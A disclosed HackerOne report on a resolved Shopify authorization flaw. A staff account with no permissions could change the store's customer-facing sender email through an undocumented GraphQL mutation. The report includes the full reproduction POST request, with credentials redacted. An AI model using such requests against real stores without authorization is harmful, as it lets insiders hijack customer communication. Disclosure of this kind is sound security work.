---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '980511'
original_report_id: '980511'
title: A staff member with no permissions can edit Store Customer Email
weakness: Insecure Direct Object Reference (IDOR)
team_handle: shopify
created_at: '2020-09-12T07:24:44.117Z'
disclosed_at: '2020-10-22T18:41:03.511Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 55
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# A staff member with no permissions can edit Store Customer Email

## Metadata

- HackerOne Report ID: 980511
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: shopify
- Disclosed At: 2020-10-22T18:41:03.511Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Impact
A staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.

## Details
`emailSenderConfigurationUpdate` is an undocumented GraphQL API that will allows a malicious staff member in a store to update the `Customer Email`. This email configuration can be found in the general settings in your store. The following screenshot shows the details.
██████████

To reproduce this finding you will need two accounts in your store. One is the Owner and the other is an account that you invite as a staff member with no permissions. The following screenshot shows the accounts setup.
{F985090}
{F985089}

1. login as the Staff user and send the following mutation GraphQL request.

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: 082760e7-3dac-481e-8741-50cb2cc61617
Host: [YOUR-DOMAIN].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 346

{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{
  "input":{
      "senderEmail":"███"
  }
}}
```
2. Login with the Owner account and check the `Store details`,the `Customer email` should be updated with the new email address.

## Impact

A staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
